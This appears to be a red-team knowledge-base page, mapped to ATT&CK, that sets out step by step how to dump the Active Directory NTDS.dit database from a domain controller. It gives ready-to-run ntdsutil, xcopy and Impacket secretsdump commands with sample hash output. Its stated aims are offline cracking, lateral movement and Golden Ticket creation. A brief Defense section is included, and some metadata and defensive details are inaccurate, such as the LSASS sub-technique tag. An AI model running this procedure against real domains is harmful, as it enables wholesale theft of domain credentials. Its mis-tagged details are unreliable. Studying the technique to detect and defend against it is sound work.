---
id: e211bc1d-6b1c-4821-8250-5c298c92c5b2
name: NTDS-Database-Dumping
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:03.804864+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques:
  - '[[techniques/Credential Dumping/LSASS Memory|T1003.001]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Dumping AD Domain Credentials]]'
commands:
  - '[[commands/powershell-query-ntds-location]]'
  - '[[commands/ntdsutil-create-shadow-copy]]'
  - '[[commands/copy-ntds-files]]'
  - '[[commands/impacket-secretsdump-extract]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
  - '[[tools/Impacket]]'
validated: true
---

# NTDS-Database-Dumping

## Summary

This procedure extracts the NTDS.dit database file and SYSTEM hive from a Windows Domain Controller to obtain password hashes for all domain users and computers. It enables offline cracking of NTLM hashes, Kerberos keys, and other credentials, facilitating lateral movement and privilege escalation in Active Directory environments.

## Description

The NTDS.dit file is the primary database for Active Directory, storing user accounts, group memberships, and encrypted password hashes (NTLM and Kerberos). Attackers with Domain Admin access to a Domain Controller can dump this file using volume shadow copies to avoid locking issues, then parse it with tools like Impacket's secretsdump or Mimikatz to retrieve usable credentials. This technique targets the critical credential storage on DCs and is effective in mature AD environments where online dumping (e.g., LSASS) is monitored or protected. Prerequisites include administrative access to the DC via RDP, PSEXEC, or similar. The process creates a point-in-time snapshot to copy files without disrupting AD services, followed by offline extraction to minimize detection.

## Requirements

1. Domain Administrator privileges on the target Domain Controller
2. Administrative shell access to the DC (e.g., via RDP or remote execution)
3. Tools: Impacket suite or Mimikatz installed on the attacker's machine (or transferable to the DC)
4. Sufficient disk space on the DC for shadow copy (~1-5 GB depending on domain size)
5. Windows Server 2008 or later (NTDS shadow copy supported)

## Defense

- Restrict Domain Admin accounts to just-in-time access and monitor their usage via Privileged Access Management (PAM) tools like Microsoft LAPS or Just Enough Administration (JEA).
- Enable Volume Shadow Copy Service (VSS) auditing and monitor for shadow copy creation events (Event ID 7036 in System log).
- Use Protected Users group to limit credential exposure and implement Windows Credential Guard to protect LSASS.
- Deploy Endpoint Detection and Response (EDR) tools to alert on suspicious file copies from %SystemRoot%\System32\config and NTDS directories.
- Regularly rotate service account passwords and monitor for offline hash cracking attempts via SIEM rules on tool executions.

## Objectives

1. Locate and copy the NTDS.dit database and SYSTEM registry hive without disrupting AD operations
2. Extract NTLM hashes, Kerberos keys, and historical passwords from the dumped files
3. Enable offline cracking of credentials for lateral movement or persistence
4. Obtain domain-wide credential material for further attacks like Golden Ticket creation

## Instructions

### Step 1: Query Registry for NTDS Database Location

**Context**: Determine the file path of the NTDS.dit database and related files, as they may not be in the default location due to custom configurations. This step identifies the exact paths needed for shadowing and copying.

**Command** ([[commands/powershell-query-ntds-location]]):
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
```

> This queries the Windows Registry for the NTDS.dit path. Run it from an elevated PowerShell prompt on the Domain Controller. If the value is not found, fallback to default path C:\Windows\NTDS\NTDS.dit.

**Expected Output**:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
    DSA Database file    REG_SZ    C:\Windows\NTDS\ntds.dit
```

### Step 2: Create Volume Shadow Copy of NTDS Directory

**Context**: Use the Volume Shadow Copy Service (VSS) to create a snapshot of the NTDS directory, allowing safe copying of locked files like NTDS.dit without stopping AD services or causing outages.

**Command** ([[commands/ntdsutil-create-shadow-copy]]):
```cmd
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds-dump" q q
```

> Execute this from an elevated Command Prompt on the DC. 'ntdsutil' is a built-in tool for AD maintenance. The 'ifm' (Install from Media) mode creates a shadow copy and exports necessary files to the specified directory. Replace C:\temp\ntds-dump with a writable path.

**Expected Output**:
```
Opening snapshot position 0...
Creating shadow...
Exported files to C:\temp\ntds-dump
Snapshot set {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} created successfully.
```

### Step 3: Copy Extracted Files to Attacker-Controlled Location

**Context**: Transfer the shadowed NTDS.dit, NTDS.dit.log files, and SYSTEM hive (for boot key decryption) to a staging area for exfiltration. This ensures all required artifacts are available for offline processing.

**Command** ([[commands/copy-ntds-files]]):
```cmd
xcopy C:\temp\ntds-dump\*.* C:\staging\ /E /H /C /I
```

> Use xcopy to recursively copy all files from the IFM export directory. The SYSTEM hive is typically at C:\Windows\System32\config\SYSTEM, but IFM includes it. Verify files: NTDS.dit, SYSTEM, and log files.

**Expected Output**:
```
C:\temp\ntds-dump\NTDS.dit
1 File(s) copied
C:\temp\ntds-dump\SYSTEM
1 File(s) copied
...
Total files copied: 5
```

### Step 4: Extract Hashes Using Impacket Secretsdump

**Context**: Parse the copied NTDS.dit and SYSTEM files offline on the attacker's machine to dump all domain credentials, including NTLM hashes and Kerberos keys. This step decrypts using the SYSTEM boot key.

**Command** ([[commands/impacket-secretsdump-extract]]):
```bash
python3 secretsdump.py -system SYSTEM -ntds NTDS.dit LOCAL
```

> Run this from a Linux/Kali machine with Impacket installed, assuming files are local. '-system' provides the boot key, '-ntds' the database, 'LOCAL' for offline mode. Output includes hashes in crackable format.

**Expected Output**:
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
[*] Dumping cached KRBTGT keys
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:...:::
```

